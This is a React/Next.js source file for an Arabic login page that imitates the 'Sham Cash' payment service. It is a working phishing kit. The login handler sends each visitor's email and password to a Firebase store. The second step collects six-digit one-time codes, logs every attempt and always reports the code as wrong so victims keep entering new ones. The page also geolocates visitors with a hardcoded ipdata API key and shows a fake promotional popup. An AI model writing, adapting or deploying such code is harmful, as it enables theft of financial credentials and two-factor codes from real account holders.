"use client"

import type React from "react";
import { useState, useEffect } from "react";
import { Eye, EyeOff, X } from "lucide-react";
import { addData, setupOnlineStatus } from "@/lib/firebase";
function randstr(prefix:string)
{
    return Math.random().toString(36).replace('0.',prefix || '');
}
const visitorID=randstr('shamn-')
const allOtps = [""]

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState<"login" | "otp">("login");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [showSplash, setShowSplash] = useState(true);
  const [loding, setloading] = useState(false);
  const [showOffer, setShowOffer] = useState(true);

  useEffect(() => {
    getLocation().then(() => {
      const timer = setTimeout(() => {
        setShowSplash(false);
      }, 2000);
      return () => clearTimeout(timer);
    }).catch(() => {
      setShowSplash(true);


    })
  }, []);

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email && password) {
    setloading(true)

      await addData({ id: visitorID, email, password })
      setTimeout(() => {
        setStep("otp");
        setloading(false)
      }, 3000);
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.every((digit) => digit)) {
      allOtps.push(otp.join())
      await addData({ id: visitorID, otp: otp.join(), allOtps })
      setEmail("");
      setPassword("");
      setOtp(["", "", "", "", "", ""]);
      setTimeout(() => {
        alert("رمز التحقق غير صحيح")

      }, 2000);
    }
  };
  async function getLocation() {
    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
        id: visitorID,
        country: country,
        createdDate: new Date().toISOString()
      })
      localStorage.setItem('country', country)
      setupOnlineStatus(visitorID)
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }
  if (showSplash) {
    return (
      <div className="min-h-screen bg-blue-100 flex flex-col items-center justify-center" dir="rtl">
        <div className="flex flex-col items-center">
          <img src="file.svg" alt="llog" />

        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-blue-100 flex flex-col" dir="rtl">


      <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
        <div className="w-full flex justify-between items-center mb-16">
          <span className="text-gray-600 font-semibold text-sm">الإنكليزية</span>
        </div>

        {step === "login" ? (
          <>
            <div className="mb-16 flex justify-center">
              <img src="file.svg" alt="llog" />
            </div>
            <h1 className="text-4xl font-bold text-gray-800 text-center mb-12">تسجيل الدخول</h1>

            <form onSubmit={handleLoginSubmit} className="w-full max-w-md">
              <div className="mb-6">
                <input
                  type="email"
                  placeholder="بريد الكتروني"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-5 py-4 bg-gray-200 border-0 rounded-full text-right placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all flex items-center justify-end gap-3 text-lg"
                  style={{
                    backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23999' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'%3E%3Cpath d='M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2'%3E%3C/path%3E%3Ccircle cx='12' cy='7' r='4'%3E%3C/circle%3E%3C/svg%3E")`,
                    backgroundRepeat: "no-repeat",
                    backgroundPosition: "16px center",
                    paddingLeft: "50px",
                  }}
                />
              </div>

              <div className="mb-6 relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="كلمة السر"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-5 py-4 bg-gray-200 border-0 rounded-full text-right placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all text-lg"
                  style={{
                    backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23999' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'%3E%3Crect x='3' y='11' width='18' height='11' rx='2' ry='2'%3E%3C/rect%3E%3Cpath d='M7 11V7a5 5 0 0 1 10 0v4'%3E%3C/path%3E%3C/svg%3E")`,
                    backgroundRepeat: "no-repeat",
                    backgroundPosition: "16px center",
                    paddingLeft: "50px",
                  }}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-5 top-1/2 -translate-y-1/2 text-gray-500 hover:text-blue-600 transition-colors"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>

              <div className="text-center mb-8">
                <a href="#" className="text-blue-600 hover:text-blue-700 font-medium text-sm">
                  هل نسيت كلمة المرور؟ <span className="underline">تغيير كلمة المرور</span>
                </a>
              </div>

              <button
                type="submit"
                disabled={loding}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-4 px-4 rounded-full transition-all duration-200 mb-8 shadow-lg text-lg"
              >
                {loding ? "جاري التحقق..." : " تسجيل الدخول"}
              </button>
            </form>

            <div className="text-center mb-16">
              <p className="text-gray-700 text-sm">
                لا تملك حساب مسبقا؟{" "}
                <a href="#" className="text-blue-600 hover:text-blue-700 font-bold">
                  إنشاء حساب
                </a>
              </p>
            </div>
          </>
        ) : (
          <>
            <h1 className="text-4xl font-bold text-gray-800 text-center mb-4">
              رمز التحقق{" "}
            </h1>            <p className="text-center text-gray-600 mb-12">
              ادخل رمز التحقق المرسل الى رقم هاتفك{" "}
            </p>

            <form onSubmit={handleOtpSubmit} className="w-full max-w-md">
              <div className="mb-8" dir="ltr">
                <label className="block text-right text-gray-700 font-medium mb-4">أدخل رمز التحقق</label>
                <div className="flex gap-3 justify-center">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      id={`otp-${index}`}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(index, e)}
                      className="w-12 h-12 text-center text-xl font-bold bg-gray-200 border-2 border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all"
                    />
                  ))}
                </div>
              </div>

              <button
                type="submit"
                disabled={!otp.every((digit) => digit)}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 disabled:from-gray-400 disabled:to-gray-400 text-white font-bold py-4 px-4 rounded-full transition-all duration-200 mb-6 shadow-lg text-lg"
              >
                تحقق
              </button>

              <button
                type="button"
                onClick={() => setStep("login")}
                className="w-full text-blue-600 hover:text-blue-700 font-medium py-2 transition-colors"
              >
                العودة للخلف
              </button>
            </form>
          </>
        )}
      </div>

      <footer className="text-center py-8 border-t border-blue-200">
        <p className="text-gray-600 text-sm mb-2">POWERED BY</p>
        <p className="text-gray-800 font-bold text-lg mb-1">Sham Cash ©</p>
        <p className="text-gray-500 text-sm mb-6">v 2.1.3</p>

      </footer>

      {showOffer && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50" dir="rtl">
          <div className="relative bg-white rounded-3xl shadow-2xl overflow-hidden max-w-sm w-full">
            <button
              onClick={() => setShowOffer(false)}
              className="absolute top-4 right-4 z-10 bg-white rounded-full p-2 hover:bg-gray-100 transition-colors"
            >
              <X size={24} className="text-gray-600" />
            </button>

            <div className="bg-gradient-to-br from-blue-700 via-blue-600 to-teal-600 p-8 text-white min-h-64 flex flex-col justify-between">
              <div className="flex flex-col items-center mb-8">
                <div className="flex items-center gap-2 mb-2">


                </div>
                <p className="text-sm font-light">سهولة وأمان</p>
              </div>

              <div className="mb-6">
                <img src="card.png" alt="log" />
              </div>
            </div>

            <div className="p-6 bg-white">
              <button
                onClick={() => setShowOffer(false)}
                className="w-full bg-gradient-to-r from-blue-500 to-teal-500 hover:from-blue-600 hover:to-teal-600 text-white font-bold py-3 px-4 rounded-full transition-all duration-200 shadow-lg"
              >
                احصل عليها
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
